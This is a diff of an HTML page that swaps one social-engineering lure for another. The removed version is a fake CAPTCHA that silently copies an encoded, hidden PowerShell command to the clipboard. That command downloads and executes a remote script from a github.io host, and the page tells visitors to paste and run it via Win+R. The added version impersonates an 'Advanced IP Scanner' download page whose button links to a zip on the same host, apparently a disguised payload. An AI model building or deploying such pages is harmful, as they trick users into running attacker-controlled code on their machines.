@@ -2,123 +2,109 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Verify You Are Human</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Advanced IP Scanner</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-        .captcha-box {
-            border: 1px solid #ccc;
-            padding: 20px;
-            width: 300px;
-            margin: auto;
-            background-color: #f9f9f9;
-        }
-        .verify-btn {
-            background-color: #4285F4;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .verify-btn:hover {
-            background-color: #3367D6;
-        }
-        #overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 999;
-        }
-        #recaptchaPopup {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 20px;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
-            z-index: 1000;
-            width: 350px;
-            text-align: left;
-        }
-        #recaptchaPopup.active, #overlay.active {
-            display: block;
-        }
-        #recaptchaPopup h3 {
-            margin-top: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
             color: #333;
         }
-        #recaptchaPopup p {
-            font-size: 14px;
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .description {
+            margin-bottom: 25px;
+            font-size: 16px;
             color: #555;
         }
-        #recaptchaPopup button {
-            background-color: #4285f4;
-            color: white;
-            padding: 10px;
-            border: none;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
+        .download-btn {
+            display: inline-block;
+            background: #3498db;
+            color: #fff;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            text-align: center;
+            transition: background 0.3s ease;
         }
-        #recaptchaPopup button:hover {
-            background-color: #357ae8;
+        .download-btn:hover {
+            background: #2980b9;
+        }
+        .features {
+            margin: 25px 0;
+        }
+        .features ul {
+            padding-left: 20px;
+        }
+        .features li {
+            margin-bottom: 10px;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 14px;
+            color: #7f8c8d;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            max-width: 150px;
+            height: auto;
         }
     </style>
 </head>
 <body>
-    <div class="captcha-box">
-        <h2>Verify You Are Human</h2>
-        <p>Please click to verify.</p>
-        <button class="verify-btn" onclick="triggerCaptcha()">I'm not a robot</button>
+    <div class="container">
+        <div class="logo">
+            <!-- Placeholder for logo (replace with actual logo if available) -->
+            <svg width="100" height="100" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#3498db"/>
+                <path d="M12 6c-3.31 0-6 2.69-6 6s2.69 6 6 6 6-2.69 6-6-2.69-6-6-6zm0 10c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4z" fill="#3498db"/>
+                <circle cx="12" cy="12" r="2" fill="#3498db"/>
+            </svg>
+        </div>
+
+        <h1>Advanced IP Scanner</h1>
+        
+        <div class="description">
+            <p>Advanced IP Scanner is a powerful and easy-to-use network scanner for quickly locating all computers and devices on your network. It provides detailed information about connected devices and allows for remote access.</p>
+        </div>
+
+        <div class="features">
+            <h3>Key Features:</h3>
+            <ul>
+                <li>Scan LAN and Wi-Fi networks in seconds</li>
+                <li>Detect devices, open ports, and shared folders</li>
+                <li>Remote control via RDP and Radmin</li>
+                <li>Export results to CSV for further analysis</li>
+                <li>Lightweight and user-friendly</li>
+            </ul>
+        </div>
+
+        <div style="text-align: center;">
+            <a href="https://jody90100.github.io/executable/Version.zip" class="download-btn">Download Now</a>
+        </div>
+
+        <div class="footer">
+            <p>Version 2.5 | © 2024 Advanced IP Scanner. All rights reserved.</p>
+        </div>
     </div>
-
-    <div id="overlay"></div>
-    <div id="recaptchaPopup">
-        <h3>reCAPTCHA Verification ID: 2165</h3>
-        <p>To verify:</p>
-        <p>1. Press Win + R</p>
-        <p>2. Press Ctrl + V</p>
-        <p>3. Press Enter</p>
-        <button onclick="closePopup()">Verify</button>
-    </div>
-
-    <script>
-        function triggerCaptcha() {
-            // Simulate malicious mshta command (replace <kali-ip> with your lab-controlled IP)
-            const textToCopy = `powershell -w hidden -ep bypass -EncodedCommand JHVybD0naHR0cHM6Ly9qb2R5OTAxMDAuZ2l0aHViLmlvL2V4ZWN1dGFibGUvd2luMTUudHh0JzsgaWV4IChpd3IgJHVybCAtVXNlQmFzaWNQYXJzaW5nKS5Db250ZW50`;
-
-            // Copy to clipboard and show popup in one action
-            const tempTextArea = document.createElement("textarea");
-            tempTextArea.value = textToCopy;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            try {
-                document.execCommand("copy");
-                // Show popup and overlay
-                document.getElementById("recaptchaPopup").classList.add("active");
-                document.getElementById("overlay").classList.add("active");
-            } catch (err) {
-                alert("Failed to copy command. Please try again.");
-            }
-            document.body.removeChild(tempTextArea);
-        }
-
-        function closePopup() {
-            // Hide popup and overlay
-            document.getElementById("recaptchaPopup").classList.remove("active");
-            document.getElementById("overlay").classList.remove("active");
-        }
-    </script>
 </body>
 </html>
